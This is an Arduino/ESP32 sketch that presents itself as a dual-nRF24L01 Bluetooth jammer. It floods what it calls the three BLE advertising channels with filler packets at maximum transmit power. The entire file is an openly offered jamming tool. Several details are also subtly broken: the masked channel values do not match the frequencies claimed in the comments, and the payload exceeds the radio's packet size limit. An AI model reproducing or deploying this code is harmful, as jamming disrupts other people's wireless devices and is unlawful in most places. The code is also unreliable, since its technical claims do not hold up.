#include <SPI.h>
#include <nRF24L01.h>
#include <RF24.h>

// Create radio instances for both SPI interfaces
RF24 radio_vspi(5, 15);  // CE, CSN for VSPI
RF24 radio_hspi(27, 14); // CE, CSN for HSPI

// BLE Advertising channels (2.402 GHz, 2.426 GHz, 2.480 GHz)
const uint64_t ble_channels[3] = {
  0x71764129C0LL,  // Channel 37 (2402 MHz)
  0x71764129D4LL,  // Channel 38 (2426 MHz)
  0x71764129E8LL   // Channel 39 (2480 MHz)
};

// Jammer payload (BLE advertising packet)
uint8_t jam_payload[37] = {
  0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42,
  0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42,
  0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42,
  0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42
};

void setup() {
  Serial.begin(115200);
  while (!Serial);
  
  Serial.println("Initializing Dual NRF24L01 Bluetooth Jammer...");

  // Initialize VSPI radio
  if (!radio_vspi.begin(&SPI, 18, 19, 23)) {
    Serial.println("VSPI radio initialization failed!");
    while (1);
  }
  
  // Initialize HSPI radio
  if (!radio_hspi.begin(&SPI1, 25, 12, 13)) {
    Serial.println("HSPI radio initialization failed!");
    while (1);
  }

  // Configure both radios
  configureRadio(radio_vspi);
  configureRadio(radio_hspi);
  
  Serial.println("Jammer ready. Starting transmission...");
}

void configureRadio(RF24& radio) {
  radio.setPALevel(RF24_PA_MAX);    // Maximum power
  radio.setDataRate(RF24_2MBPS);    // 2Mbps (BLE compatible)
  radio.setAutoAck(false);          // Disable ACK
  radio.setCRCLength(RF24_CRC_8);   // 8-bit CRC
  radio.setRetries(0, 0);           // No retries
  radio.setChannel(0);              // Will be set dynamically
  radio.stopListening();            // Put in TX mode
}

void loop() {
  static uint8_t current_channel = 0;
  
  // Alternate channels between the two radios for better coverage
  radio_vspi.setChannel(ble_channels[current_channel % 3] & 0x7F);
  radio_hspi.setChannel(ble_channels[(current_channel + 1) % 3] & 0x7F);
  
  // Transmit from both radios simultaneously
  radio_vspi.writeFast(jam_payload, sizeof(jam_payload));
  radio_hspi.writeFast(jam_payload, sizeof(jam_payload));
  
  // Toggle CE pins to ensure transmission
  radio_vspi.txStandBy();
  radio_hspi.txStandBy();
  
  // Switch channels periodically
  if (millis() % 1000 == 0) {
    current_channel = (current_channel + 1) % 3;
    Serial.print("Switching to channels: ");
    Serial.print(ble_channels[current_channel % 3] & 0x7F);
    Serial.print(" and ");
    Serial.println(ble_channels[(current_channel + 1) % 3] & 0x7F);
  }
  
  // Small delay to prevent overwhelming the radios
  delayMicroseconds(100);
}